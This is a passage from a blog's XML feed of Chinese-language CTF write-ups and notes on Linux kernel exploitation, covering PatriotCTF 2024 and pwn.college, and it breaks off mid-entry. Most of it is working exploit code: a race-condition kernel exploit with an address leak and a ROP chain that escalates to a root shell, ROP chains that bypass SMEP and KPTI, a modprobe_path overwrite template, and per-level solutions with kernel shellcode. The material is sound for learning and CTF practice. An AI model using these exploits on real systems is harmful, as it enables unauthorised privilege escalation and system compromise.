class="hljs-string">&lt;sys/ioctl.h&gt;</span>  <span class="hljs-comment">// ioctl</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span>    <span class="hljs-comment">// pthread相关函数</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span>  <span class="hljs-comment">// size_t</span></span><br><br><span class="hljs-type">int</span> fd;<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">data</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">char</span> *content;<br>    <span class="hljs-type">size_t</span> length;<br>&#125; data;<br>data storage;<br><span class="hljs-type">size_t</span> buffer[<span class="hljs-number">0x100</span>];<br><span class="hljs-type">size_t</span> buffer1[<span class="hljs-number">0x100</span>];<br><br><span class="hljs-type">long</span> <span class="hljs-title function_">Setmax</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> ioctl(fd, <span class="hljs-number">0x10</span>, size);<br>&#125;<br><br><span class="hljs-type">long</span> <span class="hljs-title function_">Leak</span><span class="hljs-params">(<span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> length)</span><br>&#123;<br><br>    storage.content = buf;<br>    storage.length = length;<br>    <span class="hljs-keyword">return</span> ioctl(fd, <span class="hljs-number">0x40</span>, buf);<br>&#125;<br><br><span class="hljs-type">long</span> <span class="hljs-title function_">Save</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">return</span> ioctl(fd, <span class="hljs-number">0x30</span>, <span class="hljs-literal">NULL</span>);<br>&#125;<br><br><span class="hljs-type">int</span> is_running = <span class="hljs-number">1</span>;<br><br><span class="hljs-type">long</span> <span class="hljs-title function_">Add</span><span class="hljs-params">(<span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> length)</span><br>&#123;<br>    storage.content = buf;<br>    storage.length = length;<br>    <span class="hljs-keyword">return</span> ioctl(fd, <span class="hljs-number">0x20</span>, &amp;storage);<br>&#125;<br><br><br><span class="hljs-type">void</span> *<span class="hljs-title function_">ThreadWriteData</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Start Write Data&quot;</span>);<br>    <span class="hljs-keyword">while</span> (is_running)<br>    &#123;<br>        <span class="hljs-type">size_t</span> ret = Add(buffer1, <span class="hljs-number">100</span>);<br>        <span class="hljs-keyword">if</span> (ret == <span class="hljs-number">0x200</span>)<br>        &#123;<br>            is_running = <span class="hljs-number">0</span>;<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Win race condition&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> *<span class="hljs-title function_">ThreadChangeLength</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Start Write Data&quot;</span>);<br>    <span class="hljs-keyword">while</span> (is_running)<br>    &#123;<br>        storage.length = <span class="hljs-number">0x200</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">size_t</span> user_sp, user_cs, user_ss, user_rflags;<br><span class="hljs-type">void</span> <span class="hljs-title function_">save_user_land</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<br>        <span class="hljs-string">&quot;.intel_syntax noprefix;&quot;</span><br>        <span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>        <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>        <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>        <span class="hljs-string">&quot;pushf;&quot;</span><br>        <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>        <span class="hljs-string">&quot;.att_syntax;&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Saved userland registers&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[#] cs: 0x%lx \n&quot;</span>, user_cs);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[#] ss: 0x%lx \n&quot;</span>, user_ss);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[#] rsp: 0x%lx \n&quot;</span>, user_sp);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[#] rflags: 0x%lx \n\n&quot;</span>, user_rflags);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">backdoor</span><span class="hljs-params">()</span><br>&#123;<br>    system(<span class="hljs-string">&quot;id&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><br>    fd = open(<span class="hljs-string">&quot;/proc/vuln&quot;</span>, O_RDWR);<br><br>    <span class="hljs-keyword">if</span> (Setmax(<span class="hljs-number">0x200</span>) != <span class="hljs-number">0x200</span>)<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Set max failed&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Set max success&quot;</span>);<br>    buffer[<span class="hljs-number">0</span>] = <span class="hljs-number">240</span>;<br>    <span class="hljs-keyword">if</span> (!Leak(buffer, <span class="hljs-number">0xe8</span>))<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Leak failed&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Leak success&quot;</span>);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> kernel_leak = buffer[<span class="hljs-number">29</span>];<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> kernel_base = kernel_leak - <span class="hljs-number">0x35691f</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> canary = buffer[<span class="hljs-number">22</span>];<br>    <span class="hljs-type">size_t</span> swapgs_restore_regs_and_return_to_usermode = kernel_base + <span class="hljs-number">0xc00a2f</span>;<br>    <span class="hljs-type">size_t</span> prepare_kernel_cred = kernel_base + <span class="hljs-number">0x895e0</span>;<br>    <span class="hljs-type">size_t</span> commit_creds = kernel_base + <span class="hljs-number">0x892c0</span>;<br>    <span class="hljs-type">size_t</span> pop_rdi_ret = kernel_base + <span class="hljs-number">0x2c3a</span>;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;kernel leak      : %p\n&quot;</span>, kernel_leak);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;kernel base      : %p\n&quot;</span>, kernel_base);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;canary           : %p\n&quot;</span>, canary);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">30</span>; i++)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;idx : %d : 0x%llx\n&quot;</span>, i, (<span class="hljs-type">size_t</span>)buffer[i]);<br>    &#125;<br>    save_user_land();<br>    <span class="hljs-type">int</span> idx = <span class="hljs-number">0x1e</span>;<br>    buffer1[idx++] = canary;<br>    idx++;<br>    idx++;<br>    idx++;<br>    buffer1[idx++] = pop_rdi_ret;<br>    buffer1[idx++] = <span class="hljs-number">0</span>;<br>    buffer1[idx++] = prepare_kernel_cred;<br>    buffer1[idx++] = commit_creds;<br>    buffer1[idx++] = swapgs_restore_regs_and_return_to_usermode + <span class="hljs-number">22</span>;<br>    buffer1[idx++] = <span class="hljs-number">0</span>;<br>    buffer1[idx++] = <span class="hljs-number">0</span>;<br>    buffer1[idx++] = backdoor;<br>    buffer1[idx++] = user_cs;<br>    buffer1[idx++] = user_rflags;<br>    buffer1[idx++] = user_sp;<br>    buffer1[idx++] = user_ss;<br><br>    <span class="hljs-type">pthread_t</span> tChangeLength;<br>    <span class="hljs-type">pthread_t</span> tWriteData;<br><br>    pthread_create(&amp;tChangeLength, <span class="hljs-literal">NULL</span>, ThreadChangeLength, <span class="hljs-literal">NULL</span>);<br>    pthread_create(&amp;tWriteData, <span class="hljs-literal">NULL</span>, ThreadWriteData, <span class="hljs-literal">NULL</span>);<br><br>    pthread_join(tChangeLength, <span class="hljs-literal">NULL</span>);<br>    pthread_join(tWriteData, <span class="hljs-literal">NULL</span>);<br><br><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (!is_running)<br>        &#123;<br>            Save();<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/09/24/PatriotCTF-2024-WP/image.png"></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>PatriotCTF2024</category>
      
      <category>Wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>PatriotCTF2024</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux Kernel Exploitation Tricks</title>
    <link href="/2024/09/19/Linux-Kernel-Exploitation-Tricks/"/>
    <url>/2024/09/19/Linux-Kernel-Exploitation-Tricks/</url>
    
    <content type="html"><![CDATA[<p>跟着H0pe师傅学的<a href="https://h0pe-ay.github.io/kernel-pwn/">Kernel-Pwn</a>，记录一下防忘</p><h1 id="绕过SEMP"><a href="#绕过SEMP" class="headerlink" title="绕过SEMP"></a>绕过SEMP</h1><h2 id="修改RC4"><a href="#修改RC4" class="headerlink" title="修改RC4"></a>修改RC4</h2><p>开启SMEP保护实际是将CR4寄存器的第20比特位置为1，native_write_cr4(size_t new_cr4)函数可以设置cr4寄存器的值<br>该方法在某次patch后不可用</p><h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><p>找Gadgets执行commit_creds(prepare_kernel_cred(0))然后swapgs，iretq返回用户态。<br>ROP Chain :</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> payload[<span class="hljs-number">256</span>];<br>payload[index++] = canary;<br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = <span class="hljs-number">0xffffffff81006370</span>; <span class="hljs-comment">//pop_rdi_ret</span><br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = <span class="hljs-number">0xffffffff814c67f0</span>; <span class="hljs-comment">//prepare_kernel_cred</span><br>payload[index++] = <span class="hljs-number">0xffffffff8150b97e</span>; <span class="hljs-comment">//pop_rsi_ret</span><br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = <span class="hljs-number">0xffffffff81006370</span>; <span class="hljs-comment">//pop_rdi_ret</span><br>payload[index++] = <span class="hljs-number">1</span>;<br>payload[index++] = <span class="hljs-number">0xffffffff818c6b35</span>; <span class="hljs-comment">//add rsi, 1; cmp rsi, rdi; jne 0xac6b30; pop rbp; ret;</span><br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = <span class="hljs-number">0xffffffff8166fea3</span>; <span class="hljs-comment">//mov rdi, rax; jne 0x86fe73; pop rbx; pop rbp; ret;</span><br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = <span class="hljs-number">0xffffffff814c6410</span>; <span class="hljs-comment">//commit_creds;</span><br>payload[index++] = <span class="hljs-number">0xffffffff8100a55f</span>; <span class="hljs-comment">//swapgs; pop rbp; ret;</span><br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = <span class="hljs-number">0xffffffff814381cb</span>; <span class="hljs-comment">//iretq; pop rbp; ret;</span><br>payload[index++] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)backdoor;<br>payload[index++] = user_cs;<br>payload[index++] = user_rflags;<br>payload[index++] = user_sp;<br>payload[index++] = user_ss;<br></code></pre></td></tr></table></figure><h2 id="栈迁移到mmap后ROP"><a href="#栈迁移到mmap后ROP" class="headerlink" title="栈迁移到mmap后ROP"></a>栈迁移到mmap后ROP</h2><p>通过pop rbp; ret; mov rsp, rbp; pop rbp; ret;这样的Gadgets将rsp设置为mmap开辟的地址，mmap内放ROP Chain。</p><h1 id="绕过KPTI"><a href="#绕过KPTI" class="headerlink" title="绕过KPTI"></a>绕过KPTI</h1><p>KPTI将用户页和内核页隔离，内核页找不到用户页，反之同样。上述利用方法在iretq的时候都会用到到用户的backdoor地址，开启KPTI后内核就找不到这个地址了。</p><h2 id="通过异常处理"><a href="#通过异常处理" class="headerlink" title="通过异常处理"></a>通过异常处理</h2><p>注册一个异常处理的函数去捕获SIGSEGV信号，在捕获到该信号时执行异常处理函数，可自定义为system(“&#x2F;bin&#x2F;sh”)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs C">signal(SIGSEGV, backdoor);<br></code></pre></td></tr></table></figure><h2 id="通过swapgs-restore-regs-and-return-to-usermode"><a href="#通过swapgs-restore-regs-and-return-to-usermode" class="headerlink" title="通过swapgs_restore_regs_and_return_to_usermode"></a>通过swapgs_restore_regs_and_return_to_usermode</h2><p>CR3用于存储页目录表（Page Directory Table）的物理地址。每个进程的CR3独立，内核与用户态进程都有独立的CR3，swapgs_restore_regs_and_return_to_usermode函数可以将CR3设置为用户态的。swapgs_restore_regs_and_return_to_usermode函数内部存在swapgs和iretq，只要将栈布置好就可以一把梭。<br>ROP Chain：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs C">payload[index++] = canary;<br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = <span class="hljs-number">0xffffffff81006370</span>; <span class="hljs-comment">//pop_rdi_ret</span><br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = <span class="hljs-number">0xffffffff814c67f0</span>; <span class="hljs-comment">//prepare_kernel_cred</span><br>payload[index++] = <span class="hljs-number">0xffffffff8150b97e</span>; <span class="hljs-comment">//pop_rsi_ret</span><br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = <span class="hljs-number">0xffffffff81006370</span>; <span class="hljs-comment">//pop_rdi_ret</span><br>payload[index++] = <span class="hljs-number">1</span>;<br>payload[index++] = <span class="hljs-number">0xffffffff818c6b35</span>; <span class="hljs-comment">//add rsi, 1; cmp rsi, rdi; jne 0xac6b30; pop rbp; ret; </span><br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = <span class="hljs-number">0xffffffff8166fea3</span>; <span class="hljs-comment">//mov rdi, rax; jne 0x86fe73; pop rbx; pop rbp; ret; </span><br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = <span class="hljs-number">0xffffffff814c6410</span>; <span class="hljs-comment">//commit_creds;</span><br>payload[index++] = <span class="hljs-number">0xffffffff81200f10</span> + <span class="hljs-number">22</span>; <span class="hljs-comment">//swapgs_restore_regs_and_return_to_usermode + 22;mov    rdi,rsp;</span><br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)backdoor;<br>payload[index++] = user_cs;<br>payload[index++] = user_rflags;<br>payload[index++] = user_sp;<br>payload[index++] = user_ss;<br></code></pre></td></tr></table></figure><p>swapgs_restore_regs_and_return_to_usermode + 22是为了跳过函数前面的一堆pop。</p><h1 id="modprobe-path"><a href="#modprobe-path" class="headerlink" title="modprobe_path"></a>modprobe_path</h1><p>运行带有错误文件头的程序内核会执行modprobe_path处的文件，改写modprobe_path可导致执行任意文件<br>模板：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> modprobe_path = <span class="hljs-number">0xffffffff00000000</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">setup</span><span class="hljs-params">()</span><br>&#123;<br>    system(<span class="hljs-string">&quot;echo -ne &#x27;#!/bin/sh\ncat /flag.txt &gt; /tmp/flag&#x27; &gt; /tmp/p&quot;</span>);<br>    system(<span class="hljs-string">&quot;chmod a+x /tmp/p&quot;</span>);<br>    system(<span class="hljs-string">&quot;echo -ne &#x27;\xff\xff\xff\xff&#x27; &gt; /tmp/exec&quot;</span>);<br>    system(<span class="hljs-string">&quot;chmod a+x /tmp/exec&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">getflag</span><span class="hljs-params">()</span><br>&#123;<br>    system(<span class="hljs-string">&quot;/tmp/exec ; cat /tmp/flag&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    setup();<br>    syscall(<span class="hljs-number">548</span>, modprobe_path, <span class="hljs-string">&quot;/tmp/p&quot;</span>);          <span class="hljs-comment">// 任意地址写</span><br>    getflag();<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="copy-user-generic-unrolled"><a href="#copy-user-generic-unrolled" class="headerlink" title="copy_user_generic_unrolled"></a>copy_user_generic_unrolled</h1><p>copy_user_generic_unrolled(to, from, 8)读取&#x2F;写入失败时，其返回的是读取&#x2F;写入失败的字节数，而成功时则返回 0，可以利用该特性爆破内核地址。</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
      <tag>Linux Kernel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwn.college Kernel Security</title>
    <link href="/2024/07/15/pwn-college-Kernel-Security/"/>
    <url>/2024/07/15/pwn-college-Kernel-Security/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>每个题的驱动都是跑在qemu虚拟机的，开启题目后需要<code>vm connect</code>连上qemu，此时<code>lsmod</code>就可以看见安装好的驱动</p><h1 id="level1-0"><a href="#level1-0" class="headerlink" title="level1.0"></a>level1.0</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell">echo pwvrvqitxoodqbxa &gt; /proc/pwncollege | head /proc/pwncollege<br></code></pre></td></tr></table></figure><h1 id="level1-1"><a href="#level1-1" class="headerlink" title="level1.1"></a>level1.1</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell">echo ufyqfbjmxahuzqzi &gt; /proc/pwncollege | head /proc/pwncollege<br></code></pre></td></tr></table></figure><h1 id="level2-0"><a href="#level2-0" class="headerlink" title="level2.0"></a>level2.0</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell">echo clxyrfcckjpuexis &gt; /proc/pwncollege | dmesg<br></code></pre></td></tr></table></figure><h1 id="level2-1"><a href="#level2-1" class="headerlink" title="level2.1"></a>level2.1</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell">echo ccvqignnvespgtyp &gt; /proc/pwncollege | dmesg<br></code></pre></td></tr></table></figure><h1 id="level3-0"><a href="#level3-0" class="headerlink" title="level3.0"></a>level3.0</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell">echo xpmylzhkfevejscw &gt; /proc/pwncollege | cat /flag<br></code></pre></td></tr></table></figure><h1 id="level3-1"><a href="#level3-1" class="headerlink" title="level3.1"></a>level3.1</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell">echo gwcifabytyzfdpjo &gt; /proc/pwncollege | cat /flag<br></code></pre></td></tr></table></figure><h1 id="level4-0"><a href="#level4-0" class="headerlink" title="level4.0"></a>level4.0</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> fd=open(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>,O_RDWR);<br>    ioctl(fd,<span class="hljs-number">1337</span>,<span class="hljs-string">&quot;emrbpgldsrexybrh&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="level4-1"><a href="#level4-1" class="headerlink" title="level4.1"></a>level4.1</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> fd=open(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>,O_RDWR);<br>    ioctl(fd,<span class="hljs-number">1337</span>,<span class="hljs-string">&quot;gixhsazzowbivqrw&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="level5-0"><a href="#level5-0" class="headerlink" title="level5.0"></a>level5.0</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-type">long</span> win = <span class="hljs-number">0xffffffffc00004cd</span>;<br>  <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>, O_WRONLY);<br>  ioctl(fd, <span class="hljs-number">1337</span>, win);<br>  system(<span class="hljs-string">&quot;id&quot;</span>);<br>  system(<span class="hljs-string">&quot;cat /flag&quot;</span>);<br>  system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="level5-1"><a href="#level5-1" class="headerlink" title="level5.1"></a>level5.1</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-type">long</span> win = <span class="hljs-number">0xffffffffc0000752</span>;<br>  <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>, O_WRONLY);<br>  ioctl(fd, <span class="hljs-number">1337</span>, win);<br>  system(<span class="hljs-string">&quot;id&quot;</span>);<br>  system(<span class="hljs-string">&quot;cat /flag&quot;</span>);<br>  system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="level6-0"><a href="#level6-0" class="headerlink" title="level6.0"></a>level6.0</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-type">char</span> shellcode[] = <span class="hljs-string">&quot;H\xc7\xc7\x00\x00\x00\x00H\xc7\xc0\xd0\x90\x08\x81\xff\xd0H\x89\xc7H\xc7\xc0\x90\x8d\x08\x81\xff\xd0\xc3&quot;</span>;<br>  <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>, O_WRONLY);<br>  write(fd,shellcode,<span class="hljs-keyword">sizeof</span>(shellcode));<br>  system(<span class="hljs-string">&quot;id&quot;</span>);<br>  system(<span class="hljs-string">&quot;cat /flag&quot;</span>);<br>  system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="level6-1"><a href="#level6-1" class="headerlink" title="level6.1"></a>level6.1</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 